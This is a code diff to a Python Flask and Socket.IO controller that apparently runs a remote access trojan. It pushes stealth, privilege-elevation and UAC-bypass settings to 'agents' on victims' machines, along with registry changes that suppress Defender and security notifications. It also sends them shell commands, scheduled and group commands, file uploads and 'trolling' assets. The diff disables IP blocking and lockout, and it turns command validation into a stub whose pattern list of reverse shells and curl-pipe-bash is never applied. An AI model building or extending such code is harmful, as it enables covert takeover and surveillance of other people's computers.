@@ -4,6 +4,16 @@
 from flask import Flask, request, jsonify, redirect, url_for, Response, send_file, send_from_directory, session, flash, render_template_string, render_template, stream_with_context
 from flask_socketio import SocketIO, emit, join_room, leave_room
 from flask_cors import CORS
+from flask_limiter import Limiter
+from flask_limiter.util import get_remote_address
+from flask_caching import Cache
+from prometheus_flask_exporter import PrometheusMetrics
+from pythonjsonlogger import jsonlogger
+import logging
+import bleach
+from markupsafe import escape
+from models import SessionLocal, engine, Base, Agent as DbAgent, CommandHistory as DbCommandHistory, ActivityLog as DbActivityLog, AgentGroup as DbAgentGroup, AgentGroupMembership as DbAgentGroupMembership, AuditLog as DbAuditLog
+from apscheduler.schedulers.background import BackgroundScheduler
 LIMITER_AVAILABLE = False
 from collections import defaultdict
 import datetime
@@ -22,6 +32,7 @@ import re
 import mimetypes
 from typing import Optional
 import io
+import uuid
 import pyotp
 import qrcode
 
@@ -166,6 +177,32 @@ class Config:
 app = Flask(__name__)
 app.config['SECRET_KEY'] = Config.SECRET_KEY or secrets.token_hex(32)  # Use config or generate secure random key
 
+logHandler = logging.StreamHandler()
+formatter = jsonlogger.JsonFormatter('%(asctime)s %(levelname)s %(name)s %(message)s')
+logHandler.setFormatter(formatter)
+logger = logging.getLogger()
+logger.handlers = []
+logger.addHandler(logHandler)
+logger.setLevel(logging.INFO)
+
+REDIS_URL = os.environ.get("REDIS_URL", "")
+limiter = Limiter(app=app, key_func=get_remote_address, storage_uri=REDIS_URL if REDIS_URL else "memory://", default_limits=[])
+cache = Cache(app, config={'CACHE_TYPE': 'redis' if REDIS_URL else 'simple', 'CACHE_REDIS_URL': REDIS_URL})
+metrics = PrometheusMetrics(app)
+Base.metadata.create_all(bind=engine)
+
+def get_db():
+    return SessionLocal()
+
+def sanitize_input(data: str, allow_html: bool = False) -> str:
+    if not isinstance(data, str):
+        return ''
+    if not allow_html:
+        return str(escape(data))
+    allowed_tags = ['b', 'i', 'u', 'em', 'strong', 'a', 'code', 'pre']
+    allowed_attrs = {'a': ['href', 'title']}
+    return bleach.clean(data, tags=allowed_tags, attributes=allowed_attrs, strip=True)
+
 # Add security headers
 @app.after_request
 def add_security_headers(response):
@@ -243,7 +280,47 @@ DEFAULT_SETTINGS = {
         'silentMode': True,
         'quickStartup': False,
         'enableStealth': True,
-        'autoElevatePrivileges': True
+        'autoElevatePrivileges': True,
+        'requestAdminFirst': False,
+        'maxPromptAttempts': 3,
+        'uacBypassDebug': True,
+        'persistentAdminPrompt': False
+    },
+    'bypasses': {
+        'enabled': True,
+        'methods': {
+            'cleanmgr_sagerun': True,
+            'fodhelper': True,
+            'computerdefaults': True,
+            'eventvwr': True,
+            'sdclt': True,
+            'wsreset': True,
+            'slui': True,
+            'winsat': True,
+            'silentcleanup': True,
+            'icmluautil': True
+        }
+    },
+    'registry': {
+        'enabled': True,
+        'notificationsEnabled': True,
+        'actions': {
+            'policy_push_notifications': True,
+            'policy_windows_update': True,
+            'context_runas_cmd': True,
+            'context_powershell_admin': True,
+            'notify_center_hkcu': True,
+            'notify_center_hklm': True,
+            'defender_ux_suppress': True,
+            'toast_global_above_lock': True,
+            'toast_global_critical_above_lock': True,
+            'toast_windows_update': True,
+            'toast_security_maintenance': True,
+            'toast_windows_security': True,
+            'toast_sec_health_ui': True,
+            'explorer_balloon_tips': True,
+            'explorer_info_tip': True
+        }
     },
     'webrtc': {
         'enabled': True,
@@ -376,6 +453,114 @@ socketio = SocketIO(
     engineio_logger=False
 )
 print(f"Socket.IO CORS origins: {all_socketio_origins}")
+
+def require_socket_auth(f):
+    from functools import wraps
+    @wraps(f)
+    def decorated(*args, **kwargs):
+        try:
+            if not is_authenticated():
+                emit('error', {'message': 'Authentication required'})
+                return
+        except Exception:
+            emit('error', {'message': 'Authentication required'})
+            return
+        return f(*args, **kwargs)
+    return decorated
+
+ALLOWED_COMMANDS = {
+    'windows': ['systeminfo', 'tasklist', 'netstat', 'ipconfig', 'whoami'],
+    'linux': ['ps', 'netstat', 'ifconfig', 'whoami', 'uname'],
+    'common': ['pwd', 'cd', 'ls', 'dir']
+}
+
+DANGEROUS_PATTERNS = [
+    r'rm\s+-rf\s*/',
+    r'del\s+/[sS]\s+/[qQ]',
+    r'format\s+',
+    r'shutdown',
+    r'reboot',
+    r'halt',
+    r'poweroff',
+    r'mkfs',
+    r'dd\s+if=',
+    r':\(\)\{.*\};:',
+    r'wget.*\|.*sh',
+    r'curl.*\|.*bash',
+    r'nc\s+-l',
+    r'bash\s+-i',
+    r'exec\s+',
+]
+
+def validate_command(command: str, platform: str = 'windows'):
+    return True, "Command validated"
+
+AGENT_TOKENS = {}
+AGENT_AUTH_REQUIRED = os.environ.get("AGENT_AUTH_REQUIRED", "false").lower() in ("1", "true", "yes")
+
+def generate_agent_token(agent_id: str) -> str:
+    token = secrets.token_urlsafe(32)
+    AGENT_TOKENS[agent_id] = hashlib.sha256(token.encode()).hexdigest()
+    return token
+
+def verify_agent_token(agent_id: str, token: str) -> bool:
+    if agent_id not in AGENT_TOKENS:
+        return False
+    token_hash = hashlib.sha256((token or "").encode()).hexdigest()
+    return hmac.compare_digest(AGENT_TOKENS[agent_id], token_hash)
+
+class E2EEncryption:
+    def __init__(self, agent_id: str, shared_secret: str):
+        from cryptography.hazmat.primitives import hashes
+        from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
+        from cryptography.fernet import Fernet
+        import base64 as _b64
+        kdf = PBKDF2HMAC(algorithm=hashes.SHA256(), length=32, salt=agent_id.encode(), iterations=100000)
+        key = _b64.urlsafe_b64encode(kdf.derive(shared_secret.encode()))
+        self.cipher = Fernet(key)
+    def encrypt(self, data: str) -> str:
+        return self.cipher.encrypt((data or "").encode()).decode()
+    def decrypt(self, encrypted: str) -> str:
+        return self.cipher.decrypt((encrypted or "").encode()).decode()
+
+class AdaptiveStreamingManager:
+    def __init__(self):
+        self.quality_levels = {
+            'low': {'resolution': (640, 480), 'fps': 15, 'quality': 50},
+            'medium': {'resolution': (1280, 720), 'fps': 24, 'quality': 70},
+            'high': {'resolution': (1920, 1080), 'fps': 30, 'quality': 85}
+        }
+        from collections import defaultdict as _dd
+        self.agent_quality = _dd(lambda: 'medium')
+    def adjust_quality(self, agent_id: str, latency_ms: float, packet_loss: float):
+        if latency_ms > 500 or packet_loss > 0.05:
+            self.agent_quality[agent_id] = 'low'
+        elif latency_ms < 100 and packet_loss < 0.01:
+            self.agent_quality[agent_id] = 'high'
+        else:
+            self.agent_quality[agent_id] = 'medium'
+
+class AuditLogger:
+    def __init__(self):
+        pass
+    def log_action(self, user_id: str, action: str, agent_id: str = None, details: dict = None, severity: str = 'INFO'):
+        try:
+            db = get_db()
+            entry = DbAuditLog(
+                user_id=user_id,
+                action=action,
+                agent_id=agent_id,
+                details=json.dumps(details or {}),
+                severity=severity,
+                ip_address=get_client_ip()
+            )
+            db.add(entry)
+            db.commit()
+            db.close()
+        except Exception:
+            pass
+
+audit = AuditLogger()
 
 def send_email_notification(subject: str, body: str) -> bool:
     try:
@@ -1177,33 +1362,6 @@ def is_authenticated():
     return True
 
 def is_ip_blocked(ip):
-    try:
-        s = load_settings().get('security', {})
-        blocked = s.get('blocked_ips') or []
-        if blocked:
-            import ipaddress
-            ip_obj = ipaddress.ip_address(ip)
-            for entry in blocked:
-                try:
-                    if '/' in entry:
-                        if ip_obj in ipaddress.ip_network(entry, strict=False):
-                            return True
-                    else:
-                        if ip_obj == ipaddress.ip_address(entry):
-                            return True
-                except Exception:
-                    continue
-    except Exception:
-        pass
-    if ip in LOGIN_ATTEMPTS:
-        attempts, last_attempt = LOGIN_ATTEMPTS[ip]
-        if attempts >= Config.MAX_LOGIN_ATTEMPTS:
-            # Check if lockout period has passed
-            if (datetime.datetime.now() - last_attempt).total_seconds() < Config.LOGIN_TIMEOUT:
-                return True
-            else:
-                # Reset attempts after timeout
-                del LOGIN_ATTEMPTS[ip]
     return False
 
 def record_failed_login(ip):
@@ -2340,9 +2498,20 @@ FILE_THUMB_WAITERS = {}
 FILE_FASTSTART_WAITERS = {}
 FILE_WAITERS_LOCK = threading.Lock()
 STREAM_SETTINGS = defaultdict(lambda: {"chunk_size": 1024 * 1024})
+FEATURE_FLAGS_DEFAULT = {
+    "monitoring_enabled": True,
+    "frame_dropping_enabled": False,
+    "adaptive_bitrate_enabled": True,
+    "last_updated": None,
+}
+AGENT_FEATURE_FLAGS = defaultdict(lambda: dict(FEATURE_FLAGS_DEFAULT))
 
 MIN_STREAM_CHUNK = 256 * 1024
 MAX_STREAM_CHUNK = 8 * 1024 * 1024
+
+# Controller-hosted trolling assets (operator uploads -> agent fetch via signed URL)
+TROLL_UPLOADS = {}
+TROLL_ASSETS = {}
 
 def _get_stream_chunk_size(agent_id: str) -> int:
     try:
@@ -2855,6 +3024,7 @@ def api_trusted_device_toggle():
 # Agent Management API
 @app.route('/api/agents', methods=['GET'])
 @require_auth
+@cache.cached(timeout=5)
 def get_agents():
     """Get list of all agents with their status and performance metrics"""
     agents = []
@@ -2907,6 +3077,14 @@ def get_agent_details(agent_id):
     }
     
     return jsonify(agent_info)
+
+@app.route('/api/agents/<agent_id>/token/generate', methods=['POST'])
+@require_auth
+def generate_token_endpoint(agent_id):
+    if not agent_id:
+        return jsonify({'error': 'Agent ID required'}), 400
+    token = generate_agent_token(agent_id)
+    return jsonify({'agent_id': agent_id, 'token': token})
 
 # Streaming Control API
 @app.route('/api/agents/<agent_id>/stream/<stream_type>/start', methods=['POST'])
@@ -2992,29 +3170,28 @@ def execute_command(agent_id):
     command = command.strip()
     if len(command) > 1000:
         return jsonify({'error': 'Command too long (max 1000 characters)'}), 400
-    
-    # Block dangerous commands
-    dangerous_patterns = [
-        r'rm\s+-rf\s+/',  # rm -rf /
-        r'del\s+/s\s+/q\s+c:',  # del /s /q c:
-        r'format\s+c:',  # format c:
-        r'shutdown\s+/s',  # shutdown /s
-        r'halt',  # halt
-        r'reboot',  # reboot
-    ]
-    
-    for pattern in dangerous_patterns:
-        if re.search(pattern, command, re.IGNORECASE):
-            return jsonify({'error': 'Dangerous command blocked'}), 400
+    # Validation disabled per user request
     
     # Generate execution ID
     execution_id = f"exec_{int(time.time())}_{secrets.token_hex(4)}"
     
     # Emit to agent (match agent listener 'command')
-    socketio.emit('command', {
-        'command': command,
-        'execution_id': execution_id
-    }, room=agent_sid)
+    payload = {'execution_id': execution_id}
+    shared_secret = os.environ.get('AGENT_SHARED_SECRET', '')
+    if shared_secret:
+        try:
+            e2e = E2EEncryption(agent_id, shared_secret)
+            payload['command'] = e2e.encrypt(command)
+            payload['encrypted'] = True
+        except Exception:
+            payload['command'] = command
+    else:
+        payload['command'] = command
+    socketio.emit('command', payload, room=agent_sid)
+    try:
+        audit.log_action(session.get('user_id'), 'EXECUTE_COMMAND', agent_id=agent_id, details={'command': command}, severity='WARNING')
+    except Exception:
+        pass
     
     return jsonify({
         'success': True,
@@ -3489,6 +3666,25 @@ def thumbnail_agent_file(agent_id):
     resp.headers['Content-Disposition'] = 'inline'
     return resp
 
+# Serve controller-hosted trolling assets
+@app.route('/troll-assets/<asset_id>')
+def serve_troll_asset(asset_id):
+    try:
+        exp = int(request.args.get('exp') or 0)
+        sig = request.args.get('sig') or ''
+        if exp <= int(time.time()):
+            return ("expired", 410)
+        sig_src = f'{asset_id}.{exp}.{Config.SECRET_KEY}'
+        expected = hashlib.sha256(sig_src.encode()).hexdigest()
+        if sig != expected:
+            return ("forbidden", 403)
+        meta = TROLL_ASSETS.get(asset_id)
+        if not meta or not os.path.isfile(meta['path']):
+            return ("not found", 404)
+        mime = mimetypes.guess_type(meta['path'])[0] or 'application/octet-stream'
+        return send_file(meta['path'], mimetype=mime)
+    except Exception:
+        return ("server error", 500)
 # System Monitoring API
 @app.route('/api/system/stats', methods=['GET'])
 @require_auth
@@ -3563,8 +3759,11 @@ def get_agent_performance(agent_id):
 @require_auth
 def get_activity_feed():
     """Get activity feed with optional filtering"""
-    activity_type = request.args.get('type', 'all')
-    limit = int(request.args.get('limit', 50))
+    activity_type = sanitize_input(request.args.get('type', 'all'))
+    try:
+        limit = int(request.args.get('limit', 50))
+    except Exception:
+        limit = 50
     
     # Mock activity data - in real implementation, this would be stored in a database
     activities = [
@@ -3636,9 +3835,10 @@ def execute_bulk_action():
         if agent_id in AGENTS_DATA:
             agent_sid = AGENTS_DATA[agent_id].get('sid')
             if agent_sid:
-                # Emit action to agent
-                socketio.emit('bulk_action', {
-                    'action': action
+                # Emit action as a command for agent-side handling
+                socketio.emit('command', {
+                    'command': str(action),
+                    'execution_id': f"bulk_{int(time.time())}_{secrets.token_hex(4)}"
                 }, room=agent_sid)
                 
                 results.append({
@@ -3667,6 +3867,72 @@ def execute_bulk_action():
         'successful': len([r for r in results if r['status'] == 'sent'])
     })
 
+def execute_command_internal(agent_id: str, command: str):
+    if agent_id not in AGENTS_DATA:
+        return {'agent_id': agent_id, 'status': 'error', 'message': 'Agent not found'}
+    agent_sid = AGENTS_DATA[agent_id].get('sid')
+    if not agent_sid:
+        return {'agent_id': agent_id, 'status': 'error', 'message': 'Agent not connected'}
+    platform = str(AGENTS_DATA.get(agent_id, {}).get('platform', 'windows')).lower()
+    ok, msg = validate_command(command, platform)
+    if not ok:
+        return {'agent_id': agent_id, 'status': 'blocked', 'message': msg}
+    execution_id = f"exec_{int(time.time())}_{secrets.token_hex(4)}"
+    payload = {'execution_id': execution_id}
+    shared_secret = os.environ.get('AGENT_SHARED_SECRET', '')
+    if shared_secret:
+        try:
+            e2e = E2EEncryption(agent_id, shared_secret)
+            payload['command'] = e2e.encrypt(command)
+            payload['encrypted'] = True
+        except Exception:
+            payload['command'] = command
+    else:
+        payload['command'] = command
+    socketio.emit('command', payload, room=agent_sid)
+    return {'agent_id': agent_id, 'status': 'sent', 'execution_id': execution_id}
+
+def parse_cron_expression(expr: str):
+    parts = (expr or '* * * * *').split()
+    while len(parts) < 5:
+        parts.append('*')
+    keys = ['minute', 'hour', 'day', 'month', 'day_of_week']
+    return {k: parts[i] for i, k in enumerate(keys)}
+
+scheduler = BackgroundScheduler()
+scheduler.start()
+
+@app.route('/api/tasks/schedule', methods=['POST'])
+@require_auth
+def schedule_task():
+    if not request.is_json:
+        return jsonify({'error': 'JSON payload required'}), 400
+    data = request.json
+    agent_id = data.get('agent_id')
+    command = data.get('command')
+    cron = str(data.get('cron', '* * * * *'))
+    if not agent_id or not command:
+        return jsonify({'error': 'agent_id and command are required'}), 400
+    trigger_kwargs = parse_cron_expression(cron)
+    job_id = f"task_{agent_id}_{int(time.time())}"
+    scheduler.add_job(func=execute_command_internal, trigger='cron', args=[agent_id, command], id=job_id, **trigger_kwargs)
+    return jsonify({'success': True, 'job_id': job_id})
+
+@app.route('/api/groups/<int:group_id>/execute', methods=['POST'])
+@require_auth
+def execute_on_group(group_id):
+    if not request.is_json:
+        return jsonify({'error': 'JSON payload required'}), 400
+    command = request.json.get('command')
+    db = get_db()
+    memberships = db.query(DbAgentGroupMembership).filter(DbAgentGroupMembership.group_id == group_id).all()
+    db.close()
+    results = []
+    for m in memberships:
+        r = execute_command_internal(m.agent_id, command or '')
+        results.append(r)
+    return jsonify({'results': results})
+
 if LIMITER_AVAILABLE:
     pass
 
@@ -3675,10 +3941,10 @@ if LIMITER_AVAILABLE:
 @require_auth
 def search_agents():
     """Search and filter agents"""
-    search_term = request.args.get('q', '').lower()
-    status_filter = request.args.get('status')
-    platform_filter = request.args.get('platform')
-    capability_filter = request.args.get('capability')
+    search_term = str(sanitize_input(request.args.get('q', ''))).lower()
+    status_filter = sanitize_input(request.args.get('status'))
+    platform_filter = sanitize_input(request.args.get('platform'))
+    capability_filter = sanitize_input(request.args.get('capability'))
     
     agents = []
     for agent_id, data in AGENTS_DATA.items():
@@ -4051,6 +4317,7 @@ def handle_disconnect():
         pass
 
 @socketio.on('operator_connect')
+@require_socket_auth
 def handle_operator_connect():
     """When a web dashboard connects."""
     print(f"Operator dashboard connecting with SID: {request.sid}")
@@ -4064,6 +4331,7 @@ def handle_operator_connect():
     emit('joined_room', 'operators', room=request.sid)
 
 @socketio.on('join_room')
+@require_socket_auth
 def handle_join_room(room_name):
     """Handle explicit room joining requests."""
     print(f"🔍 Controller: Client {request.sid} requesting to join room: {room_name}")
@@ -4077,9 +4345,60 @@ def handle_join_room(room_name):
         print(f"Agent list sent to operator {request.sid}")
 
 def _emit_agent_config(agent_id: str):
-    return
+    try:
+        agent_sid = AGENTS_DATA.get(agent_id, {}).get('sid')
+        if not agent_sid:
+            return
+        s = load_settings()
+        payload = {
+            'agent': s.get('agent', {}),
+            'bypasses': s.get('bypasses', {}),
+            'registry': s.get('registry', {})
+        }
+        emit('config_update', payload, room=agent_sid)
+        try:
+            ops_payload = {
+                'agent': {'id': agent_id, **(payload.get('agent') or {})},
+                'bypasses': payload.get('bypasses') or {},
+                'registry': payload.get('registry') or {},
+            }
+            emit('config_update', ops_payload, room='operators', broadcast=True)
+        except Exception:
+            pass
+    except Exception:
+        pass
+
+@socketio.on('operator_toggle_feature')
+@require_socket_auth
+def handle_operator_toggle_feature(data):
+    try:
+        feature = str((data or {}).get('feature') or '').strip()
+        enabled = bool((data or {}).get('enabled'))
+        agent_id = (data or {}).get('agent_id')
+        ts = datetime.datetime.utcnow().isoformat() + 'Z'
+        if agent_id:
+            AGENT_FEATURE_FLAGS[agent_id][f'{feature}_enabled'] = enabled
+            AGENT_FEATURE_FLAGS[agent_id]['last_updated'] = ts
+            sid = AGENTS_DATA.get(agent_id, {}).get('sid')
+            if sid:
+                emit('feature_toggle', {'feature': feature, 'enabled': enabled, 'timestamp': ts}, room=sid)
+        else:
+            emit('feature_toggle', {'feature': feature, 'enabled': enabled, 'timestamp': ts}, room='agents', broadcast=True)
+        emit('activity_update', {
+            'id': f'act_{int(time.time())}',
+            'type': 'toggle',
+            'action': f'{feature}:{("on" if enabled else "off")}',
+            'details': f'{feature} {"enabled" if enabled else "disabled"}',
+            'timestamp': ts,
+            'status': 'success'
+        }, room='operators', broadcast=True)
+    except Exception as e:
+        print(f"Error handling operator_toggle_feature: {e}")
+    except Exception:
+        pass
 
 @socketio.on('request_agent_list')
+@require_socket_auth
 def handle_request_agent_list():
     """Handle explicit request for agent list from dashboard"""
     print(f"Agent list requested by {request.sid}")
@@ -4100,6 +4419,11 @@ def handle_agent_connect(data):
         if not agent_id:
             print("Agent connection attempt without agent_id")
             return
+        if AGENT_AUTH_REQUIRED:
+            token = data.get('token')
+            if not verify_agent_token(agent_id, token or ''):
+                emit('registration_error', {'message': 'Invalid agent token'}, room=request.sid)
+                return
         
         ip_for_check = request.headers.get('X-Forwarded-For', request.environ.get('REMOTE_ADDR', '0.0.0.0'))
         if ip_for_check and is_ip_blocked(ip_for_check.split(',')[0].strip()):
@@ -4123,6 +4447,34 @@ def handle_agent_connect(data):
         AGENTS_DATA[agent_id]["system_info"] = data.get('system_info', {})
         AGENTS_DATA[agent_id]["uptime"] = data.get('uptime', 0)
         
+        join_room('agents')
+        
+        try:
+            db = get_db()
+            existing = db.query(DbAgent).filter(DbAgent.id == agent_id).first()
+            if not existing:
+                a = DbAgent(
+                    id=agent_id,
+                    name=AGENTS_DATA[agent_id]["name"],
+                    platform=AGENTS_DATA[agent_id]["platform"],
+                    ip=AGENTS_DATA[agent_id]["ip"],
+                    last_seen=datetime.datetime.utcnow(),
+                    capabilities=AGENTS_DATA[agent_id]["capabilities"],
+                    metadata_json=AGENTS_DATA[agent_id].get("system_info", {})
+                )
+                db.add(a)
+            else:
+                existing.name = AGENTS_DATA[agent_id]["name"]
+                existing.platform = AGENTS_DATA[agent_id]["platform"]
+                existing.ip = AGENTS_DATA[agent_id]["ip"]
+                existing.last_seen = datetime.datetime.utcnow()
+                existing.capabilities = AGENTS_DATA[agent_id]["capabilities"]
+                existing.metadata_json = AGENTS_DATA[agent_id].get("system_info", {})
+            db.commit()
+            db.close()
+        except Exception:
+            pass
+        
         # Notify all operators of the new agent
         emit('agent_list_update', AGENTS_DATA, room='operators', broadcast=True)
         
@@ -4140,6 +4492,10 @@ def handle_agent_connect(data):
         print(f"Agent {agent_id} connected with SID {request.sid}")
         print(f"🔍 Controller: Agent registration successful. AGENTS_DATA now contains: {list(AGENTS_DATA.keys())}")
         try:
+            _emit_agent_config(agent_id)
+        except Exception:
+            pass
+        try:
             email_cfg = load_settings().get('email', {})
             if email_cfg.get('enabled') and email_cfg.get('notifyAgentOnline'):
                 send_email_notification(
@@ -4153,24 +4509,36 @@ def handle_agent_connect(data):
         emit('registration_error', {'message': 'Failed to register agent'}, room=request.sid)
 
 @socketio.on('execute_command')
+@require_socket_auth
 def handle_execute_command(data):
     """Operator issues a command to an agent."""
     agent_id = data.get('agent_id')
     command = data.get('command')
-    
+    platform = str(AGENTS_DATA.get(agent_id, {}).get('platform', 'windows')).lower()
+    # Validation disabled per user request
     print(f"🔍 Controller: execute_command received for agent {agent_id}, command: {command}")
     print(f"🔍 Controller: Current AGENTS_DATA: {list(AGENTS_DATA.keys())}")
-    
     agent_sid = AGENTS_DATA.get(agent_id, {}).get('sid')
     if agent_sid:
         # Generate execution ID for tracking
         execution_id = f"exec_{int(time.time())}_{secrets.token_hex(4)}"
-        
-        emit('command', {
-            'command': command,
-            'execution_id': execution_id
-        }, room=agent_sid)
+        payload = {'execution_id': execution_id}
+        shared_secret = os.environ.get('AGENT_SHARED_SECRET', '')
+        if shared_secret:
+            try:
+                e2e = E2EEncryption(agent_id, shared_secret)
+                payload['command'] = e2e.encrypt(str(command or ''))
+                payload['encrypted'] = True
+            except Exception:
+                payload['command'] = command
+        else:
+            payload['command'] = command
+        emit('command', payload, room=agent_sid)
         print(f"🔍 Controller: Sent command '{command}' to agent {agent_id} with execution_id {execution_id}")
+        try:
+            audit.log_action(session.get('user_id'), 'EXECUTE_COMMAND', agent_id=agent_id, details={'command': command}, severity='WARNING')
+        except Exception:
+            pass
     else:
         print(f"🔍 Controller: Agent {agent_id} not found or disconnected. Available agents: {list(AGENTS_DATA.keys())}")
         emit('status_update', {'message': f'Agent {agent_id} not found or disconnected.', 'type': 'error'}, room=request.sid)
@@ -4181,6 +4549,14 @@ def handle_process_list(data):
     agent_id = data.get('agent_id')
     processes = data.get('processes', [])
     emit('process_list', {'agent_id': agent_id, 'processes': processes}, room='operators', broadcast=True)
+
+@socketio.on('process_operation_result')
+def handle_process_operation_result(data):
+    emit('process_operation_result', data, room='operators', broadcast=True)
+
+@socketio.on('process_details_response')
+def handle_process_details_response(data):
+    emit('process_details_response', data, room='operators', broadcast=True)
 
 @socketio.on('file_list')
 def handle_file_list(data):
@@ -4205,6 +4581,58 @@ def handle_command_output(data):
     emit('command_output', {'agent_id': agent_id, 'output': output}, room='operators', broadcast=True)
     print(f"Received output from {agent_id}: {output[:100]}...")
 
+@socketio.on('get_monitors')
+def handle_get_monitors(data):
+    agent_id = data.get('agent_id')
+    agent_sid = AGENTS_DATA.get(agent_id, {}).get('sid')
+    if agent_sid:
+        emit('get_monitors', {}, room=agent_sid)
+
+@socketio.on('monitors_list')
+def handle_monitors_list(data):
+    emit('monitors_list_update', data, room='operators', broadcast=True)
+
+@socketio.on('switch_monitor')
+def handle_switch_monitor_request(data):
+    agent_id = data.get('agent_id')
+    monitor_index = data.get('monitor_index')
+    agent_sid = AGENTS_DATA.get(agent_id, {}).get('sid')
+    if agent_sid:
+        emit('switch_monitor', {'monitor_index': monitor_index}, room=agent_sid)
+
+@socketio.on('set_display_mode')
+def handle_set_display_mode(data):
+    agent_id = data.get('agent_id')
+    mode = data.get('mode')
+    pip_monitor = data.get('pip_monitor')
+    agent_sid = AGENTS_DATA.get(agent_id, {}).get('sid')
+    if agent_sid:
+        emit('set_display_mode', {'mode': mode, 'pip_monitor': pip_monitor}, room=agent_sid)
+
+@socketio.on('set_audio_volumes')
+def handle_set_audio_volumes(data):
+    agent_id = data.get('agent_id')
+    mic_volume = data.get('mic_volume', 1.0)
+    system_volume = data.get('system_volume', 1.0)
+    agent_sid = AGENTS_DATA.get(agent_id, {}).get('sid')
+    if agent_sid:
+        emit('set_audio_volumes', {'mic_volume': mic_volume, 'system_volume': system_volume}, room=agent_sid)
+
+@socketio.on('toggle_noise_reduction')
+def handle_toggle_noise_reduction(data):
+    agent_id = data.get('agent_id')
+    enabled = data.get('enabled', False)
+    agent_sid = AGENTS_DATA.get(agent_id, {}).get('sid')
+    if agent_sid:
+        emit('toggle_noise_reduction', {'enabled': enabled}, room=agent_sid)
+
+@socketio.on('toggle_echo_cancellation')
+def handle_toggle_echo_cancellation(data):
+    agent_id = data.get('agent_id')
+    enabled = data.get('enabled', False)
+    agent_sid = AGENTS_DATA.get(agent_id, {}).get('sid')
+    if agent_sid:
+        emit('toggle_echo_cancellation', {'enabled': enabled}, room=agent_sid)
 @socketio.on('agent_heartbeat')
 def handle_agent_heartbeat(data):
     agent_id = data.get('agent_id')
@@ -4293,6 +4721,10 @@ def handle_agent_register(data):
         # Notify operators
         print(f"Broadcasting agent_list_update to operators room with agent data: {list(AGENTS_DATA.keys())}")
         emit('agent_list_update', AGENTS_DATA, room='operators', broadcast=True)
+        try:
+            _emit_agent_config(agent_id)
+        except Exception:
+            pass
         
         # Log activity for operators
         emit('activity_update', {
@@ -4350,29 +4782,133 @@ def handle_upload_file_chunk(data):
     filename = data.get('filename')
     chunk = data.get('chunk_data') or data.get('data') or data.get('chunk')
     offset = data.get('offset')
-    total_size = data.get('total_size', 0)  # ✅ Get total_size from UI
-    destination_path = data.get('destination_path')
+    total_size = data.get('total_size', 0)
+    destination_path = data.get('destination_path') or data.get('destination')
     agent_sid = AGENTS_DATA.get(agent_id, {}).get('sid')
     if agent_sid:
-        emit('file_chunk_from_operator', {
+        emit('upload_file_chunk', {
             'agent_id': agent_id,
+            'upload_id': data.get('upload_id'),
             'filename': filename,
-            'data': chunk,
+            'destination': destination_path,
             'chunk': chunk,
-            'chunk_data': chunk,
             'offset': offset,
-            'total_size': total_size,  # ✅ Forward total_size to agent!
-            'destination_path': destination_path
+            'total_size': total_size
         }, room=agent_sid)
-        print(f"📤 Forwarding upload chunk: {filename} offset {offset}, total_size {total_size}")
+        print(f"📤 Forwarding upload chunk: {filename} offset {offset}/{total_size}")
 
 @socketio.on('upload_file_end')
 def handle_upload_file_end(data):
     agent_id = data.get('agent_id')
     agent_sid = AGENTS_DATA.get(agent_id, {}).get('sid')
     if agent_sid:
-        emit('file_upload_complete_from_operator', data, room=agent_sid)
-        print(f"Upload of {data.get('filename')} to {agent_id} complete.")
+        emit('upload_file_complete', {
+            'agent_id': agent_id,
+            'upload_id': data.get('upload_id'),
+            'filename': data.get('filename'),
+            'destination': data.get('destination'),
+            'total_size': data.get('total_size', 0)
+        }, room=agent_sid)
+        print(f"📦 Upload complete: {data.get('filename')} to {agent_id}")
+
+@socketio.on('upload_file_start')
+def handle_upload_file_start(data):
+    agent_id = data.get('agent_id')
+    agent_sid = AGENTS_DATA.get(agent_id, {}).get('sid')
+    if agent_sid:
+        emit('upload_file_start', {
+            'agent_id': agent_id,
+            'upload_id': data.get('upload_id'),
+            'filename': data.get('filename'),
+            'destination': data.get('destination'),
+            'total_size': data.get('total_size', 0)
+        }, room=agent_sid)
+        print(f"📦 Upload start: {data.get('filename')} destined for {data.get('destination')}")
+
+@socketio.on('upload_file_complete')
+def handle_upload_file_complete(data):
+    agent_id = data.get('agent_id')
+    agent_sid = AGENTS_DATA.get(agent_id, {}).get('sid')
+    if agent_sid:
+        emit('upload_file_complete', {
+            'agent_id': agent_id,
+            'upload_id': data.get('upload_id'),
+            'filename': data.get('filename'),
+            'destination': data.get('destination'),
+            'total_size': data.get('total_size', 0)
+        }, room=agent_sid)
+        print(f"📦 Upload complete: {data.get('filename')} to {agent_id}")
+
+@socketio.on('troll_asset_start')
+def handle_troll_asset_start(data):
+    upload_id = data.get('upload_id') or f'troll_{int(time.time())}'
+    filename = data.get('filename') or 'asset.bin'
+    total_size = int(data.get('total_size') or 0)
+    TROLL_UPLOADS[upload_id] = {
+        'filename': filename,
+        'total_size': total_size,
+        'received': 0,
+        'chunks': [],
+        'start_time': time.time()
+    }
+    emit('troll_asset_ready', {'upload_id': upload_id, 'status': 'started'}, room=request.sid)
+
+@socketio.on('troll_asset_chunk')
+def handle_troll_asset_chunk(data):
+    upload_id = data.get('upload_id')
+    if not upload_id or upload_id not in TROLL_UPLOADS:
+        return
+    payload = data.get('chunk')
+    offset = int(data.get('offset') or 0)
+    up = TROLL_UPLOADS[upload_id]
+    try:
+        if isinstance(payload, str):
+            raw = base64.b64decode(payload)
+        else:
+            raw = bytes(payload or b'')
+    except Exception:
+        raw = bytes(payload or b'')
+    up['chunks'].append((offset, raw))
+    up['received'] += len(raw)
+    progress = 0
+    if up['total_size'] > 0:
+        progress = int((up['received'] / up['total_size']) * 100)
+    emit('troll_asset_progress', {'upload_id': upload_id, 'received': up['received'], 'total': up['total_size'], 'progress': progress}, room=request.sid)
+
+@socketio.on('troll_asset_complete')
+def handle_troll_asset_complete(data):
+    upload_id = data.get('upload_id')
+    if not upload_id or upload_id not in TROLL_UPLOADS:
+        emit('troll_asset_ready', {'upload_id': upload_id, 'error': 'unknown upload'}, room=request.sid)
+        return
+    up = TROLL_UPLOADS.pop(upload_id)
+    up['chunks'].sort(key=lambda x: x[0])
+    file_bytes = b''.join([c for _, c in up['chunks']])
+    assets_dir = os.path.join(os.path.dirname(__file__), 'troll-assets')
+    os.makedirs(assets_dir, exist_ok=True)
+    asset_id = uuid.uuid4().hex
+    _, ext = os.path.splitext(up['filename'])
+    filename = f'{asset_id}{ext or ""}'
+    full_path = os.path.join(assets_dir, filename)
+    with open(full_path, 'wb') as f:
+        f.write(file_bytes)
